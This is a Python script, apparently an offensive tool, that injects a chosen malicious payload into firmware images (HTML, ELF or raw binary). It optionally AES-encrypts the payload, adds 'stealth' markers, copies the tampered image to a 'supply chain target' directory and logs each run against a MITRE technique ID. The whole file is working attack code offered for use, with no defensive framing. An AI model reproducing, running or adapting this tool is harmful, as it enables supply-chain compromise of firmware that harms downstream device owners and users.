import os
import argparse
import shutil
import json
import struct
from datetime import datetime
from hashlib import sha256
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

LOG_PATH = "results/supply_chain_seed_logs.json"
MITRE_TTP = "T1608.002"
STEALTH_MARKER = b"\n<!-- INJECTED -->\n"

def log_seeding(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def encrypt_payload(payload_data, key):
    cipher = AES.new(key, AES.MODE_CBC, iv=key[:16])
    return cipher.encrypt(pad(payload_data, 16))

def detect_firmware_type(fw_path):
    with open(fw_path, "rb") as f:
        sig = f.read(4)
        if sig.startswith(b"\x7fELF"):
            return "elf"
        elif b"<html" in f.read(1024).lower():
            return "html"
        else:
            return "bin"

def inject_payload(firmware_path, payload_path, output_path, encryption_key=None, stealth=False):
    with open(firmware_path, "rb") as f:
        original = f.read()
    with open(payload_path, "rb") as p:
        payload = p.read()

    if encryption_key:
        payload = encrypt_payload(payload, encryption_key)
        print("[*] Payload encrypted using AES-128")

    fw_type = detect_firmware_type(firmware_path)
    print(f"[*] Detected firmware type: {fw_type}")

    if fw_type == "html":
        injection = original.replace(b"</body>", STEALTH_MARKER + payload + b"</body>")
    elif fw_type == "elf":
        injection = original + b"\n" + b"\x00" * 128 + payload
    else:
        injection = original + b"\n" + payload

    if stealth:
        injection += b"\n<!-- TIMESTAMP: %s -->" % datetime.utcnow().isoformat().encode()

    with open(output_path, "wb") as out:
        out.write(injection)

    return sha256(injection).hexdigest(), output_path

def seed_to_target(firmware_path, target_dir):
    os.makedirs(target_dir, exist_ok=True)
    dst = os.path.join(target_dir, os.path.basename(firmware_path))
    shutil.copy(firmware_path, dst)
    return dst

def execute(firmware, payload, staging_dir, encryption_key=None, stealth=False):
    print(f"[+] Injecting payload into firmware image...")
    staged_output = "results/firmware_staged.img"
    enc_key = encryption_key.encode() if encryption_key else None

    hash_val, out_path = inject_payload(firmware, payload, staged_output, enc_key, stealth)

    print(f"[+] Seeding modified firmware to staging path: {staging_dir}")
    deployed_path = seed_to_target(out_path, staging_dir)

    log_seeding({
        "timestamp": datetime.utcnow().isoformat(),
        "original_firmware": firmware,
        "payload_injected": payload,
        "encrypted": bool(encryption_key),
        "staged_output": deployed_path,
        "sha256": hash_val,
        "stealth": stealth,
        "ttp": MITRE_TTP
    })

    print(f"[✓] Firmware seeded to {deployed_path}")
    print(f"[✓] SHA256: {hash_val}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="REAL Firmware Supply Chain Seeder (Military Grade)")
    parser.add_argument("--firmware", required=True, help="Original firmware image to modify")
    parser.add_argument("--payload", required=True, help="Malicious binary or script to inject")
    parser.add_argument("--stage-dir", required=True, help="Directory representing supply chain target")
    parser.add_argument("--encrypt-key", help="AES key to encrypt the payload (16 bytes)")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth injection (invisible footer markers, timestamps)")

    args = parser.parse_args()

    execute(
        firmware=args.firmware,
        payload=args.payload,
        staging_dir=args.stage_dir,
        encryption_key=args.encrypt_key,
        stealth=args.stealth
    )
